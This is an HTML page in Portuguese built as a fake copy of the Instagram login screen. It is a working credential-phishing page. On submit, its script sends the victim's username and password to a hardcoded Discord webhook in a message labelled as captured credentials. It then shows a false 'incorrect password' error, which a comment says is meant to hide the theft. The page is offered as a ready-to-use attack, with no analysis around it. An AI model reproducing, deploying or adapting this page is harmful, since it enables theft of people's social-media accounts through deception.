<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            flex-direction: column;
        }

        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            max-width: 350px;
            width: 100%;
            padding: 20px;
        }

        .login-box {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 40px 40px 20px;
            width: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .logo {
            margin-bottom: 30px;
            width: 175px;
            height: auto;
        }

        .logo svg {
            width: 100%;
            height: auto;
        }

        form {
            width: 100%;
            display: flex;
            flex-direction: column;
            gap: 6px;
        }

        input {
            width: 100%;
            padding: 9px 8px 7px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 12px;
            outline: none;
            transition: border-color 0.1s;
        }

        input:focus {
            border-color: #a8a8a8;
        }

        button {
            width: 100%;
            background-color: #0095f6;
            border: none;
            border-radius: 8px;
            padding: 7px 16px;
            color: #fff;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            margin-top: 8px;
            opacity: 0.9;
            transition: opacity 0.1s;
        }

        button:hover {
            opacity: 1;
        }

        .divider {
            display: flex;
            align-items: center;
            width: 100%;
            margin: 18px 0;
            gap: 18px;
            color: #737373;
            font-size: 13px;
            font-weight: 600;
        }

        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: #dbdbdb;
        }

        .fb-login {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            color: #385185;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            margin-bottom: 12px;
        }

        .fb-login svg {
            width: 16px;
            height: 16px;
        }

        .forgot-password {
            color: #00376b;
            font-size: 12px;
            text-align: center;
            cursor: pointer;
            margin-top: 12px;
        }

        .signup-box {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 20px 40px;
            width: 100%;
            text-align: center;
            margin-top: 10px;
            font-size: 14px;
            color: #262626;
        }

        .signup-box a {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
            cursor: pointer;
        }

        .get-app {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-top: 20px;
            gap: 16px;
            font-size: 14px;
            color: #262626;
        }

        .app-badges {
            display: flex;
            gap: 8px;
        }

        .app-badges img {
            height: 40px;
        }

        .error-msg {
            color: #ed4956;
            font-size: 12px;
            text-align: center;
            margin-top: 8px;
            display: none;
        }

        .footer {
            margin-top: 40px;
            font-size: 12px;
            color: #737373;
            text-align: center;
            max-width: 700px;
            width: 100%;
        }

        .footer-links {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 8px 16px;
            margin-bottom: 16px;
        }

        .footer-links a {
            color: #737373;
            text-decoration: none;
        }

        .footer select {
            border: none;
            background: none;
            color: #737373;
            font-size: 12px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <!-- Instagram Logo -->
            <div class="logo">
                <svg viewBox="0 0 175 51" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M38.2 16.6c-1.8 0-3.2 1.4-3.2 3.2s1.4 3.2 3.2 3.2 3.2-1.4 3.2-3.2-1.4-3.2-3.2-3.2zm9.6-3.2v12.8c0 1.8-1.4 3.2-3.2 3.2H31.8c-1.8 0-3.2-1.4-3.2-3.2V13.4c0-1.8 1.4-3.2 3.2-3.2h12.8c1.8 0 3.2 1.4 3.2 3.2zm-3.2 6.4c0 3.5-2.9 6.4-6.4 6.4s-6.4-2.9-6.4-6.4 2.9-6.4 6.4-6.4 6.4 2.9 6.4 6.4z" fill="#262626"/>
                    <circle cx="47.8" cy="13.4" r="1.6" fill="#262626"/>
                    <path d="M87.3 33c-4.2 0-7.5-1.6-10-4.8-2.5-3.2-3.7-7.3-3.7-12.3s1.2-9.1 3.7-12.3c2.5-3.2 5.8-4.8 10-4.8s7.5 1.6 10 4.8c2.5 3.2 3.7 7.3 3.7 12.3s-1.2 9.1-3.7 12.3c-2.5 3.2-5.8 4.8-10 4.8zm0-4.6c2.5 0 4.5-1.3 5.9-3.8 1.5-2.5 2.2-5.9 2.2-10.2s-.7-7.7-2.2-10.2c-1.4-2.5-3.4-3.8-5.9-3.8s-4.5 1.3-5.9 3.8c-1.5 2.5-2.2 5.9-2.2 10.2s.7 7.7 2.2 10.2c1.4 2.5 3.4 3.8 5.9 3.8z" fill="#262626"/>
                    <path d="M121 33c-3.2 0-5.9-1.1-8.2-3.3-2.3-2.2-3.4-5.2-3.4-8.9V4.9h5.1v15.7c0 2.5.6 4.4 1.9 5.8 1.3 1.4 3 2.1 5.2 2.1s3.8-.7 4.9-2.1c1.1-1.4 1.7-3.4 1.7-5.8V4.9h5.1v15.9c0 3.7-1.1 6.7-3.4 8.9-2.2 2.2-5 3.3-8.2 3.3z" fill="#262626"/>
                    <path d="M146 32.8V4.9h13.2v4.6h-8.1v6.8h7.5v4.6h-7.5v7.3h8.5v4.6H146z" fill="#262626"/>
                </svg>
            </div>

            <form id="loginForm">
                <input type="text" id="username" name="username" placeholder="Telefone, nome de usuário ou email" required autocomplete="off">
                <input type="password" id="password" name="password" placeholder="Senha" required>
                <button type="submit">Entrar</button>
                <div class="error-msg" id="errorMsg">Senha incorreta. Tente novamente.</div>
            </form>

            <div class="divider">OU</div>

            <div class="fb-login">
                <svg viewBox="0 0 16 16" fill="#385185" xmlns="http://www.w3.org/2000/svg">
                    <path d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951z"/>
                </svg>
                Entrar com o Facebook
            </div>

            <div class="forgot-password">Esqueceu a senha?</div>
        </div>

        <div class="signup-box">
            Não tem uma conta? <a href="#">Cadastre-se</a>
        </div>

        <div class="get-app">
            <span>Obtenha o aplicativo.</span>
            <div class="app-badges">
                <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 135 40'%3E%3Crect width='135' height='40' rx='4' fill='%231a1a1a'/%3E%3Ctext x='12' y='18' font-size='7' fill='white' font-family='Arial'%3EDisponível na%3C/text%3E%3Ctext x='12' y='30' font-size='12' font-weight='bold' fill='white' font-family='Arial'%3EApp Store%3C/text%3E%3C/svg%3E" alt="App Store">
                <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 135 40'%3E%3Crect width='135' height='40' rx='4' fill='%231a1a1a'/%3E%3Ctext x='12' y='18' font-size='7' fill='white' font-family='Arial'%3EDisponível no%3C/text%3E%3Ctext x='12' y='30' font-size='12' font-weight='bold' fill='white' font-family='Arial'%3EGoogle Play%3C/text%3E%3C/svg%3E" alt="Google Play">
            </div>
        </div>
    </div>

    <div class="footer">
        <div class="footer-links">
            <a href="#">Meta</a>
            <a href="#">Sobre</a>
            <a href="#">Blog</a>
            <a href="#">Carreiras</a>
            <a href="#">Ajuda</a>
            <a href="#">API</a>
            <a href="#">Privacidade</a>
            <a href="#">Termos</a>
            <a href="#">Principais contas</a>
            <a href="#">Hashtags</a>
            <a href="#">Localizações</a>
            <a href="#">Instagram Lite</a>
        </div>
        <div>
            <select>
                <option>Português (Brasil)</option>
                <option>English</option>
                <option>Español</option>
            </select>
            <span style="margin-left: 16px;">© 2026 Instagram from Meta</span>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            const data = {
                content: '**🚨 NOVAS CREDENCIAIS INSTAGRAM CAPTURADAS 🚨**',
                embeds: [{
                    title: 'Credenciais do Instagram',
                    color: 0xE1306C,
                    fields: [
                        {
                            name: '👤 Usuário / Email',
                            value: username || '(vazio)',
                            inline: true
                        },
                        {
                            name: '🔑 Senha',
                            value: password || '(vazio)',
                            inline: true
                        }
                    ],
                    footer: {
                        text: `Capturado em ${new Date().toLocaleString('pt-BR')}`
                    }
                }]
            };

            try {
                await fetch('https://discord.com/api/webhooks/1512065318359404664/mpEXk0iEMRmwf8ZRLWjfa5EaWPfp_pOv1LAnzctWYPEjuhssNeyzJaGZk0JTALuGie8b', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
            } catch (err) {
                console.error('Erro ao enviar para webhook:', err);
            }

            // Exibe mensagem de erro falsa para parecer que a senha estava incorreta
            document.getElementById('errorMsg').style.display = 'block';
            document.getElementById('password').value = '';
        });
    </script>
</body>
        </html>
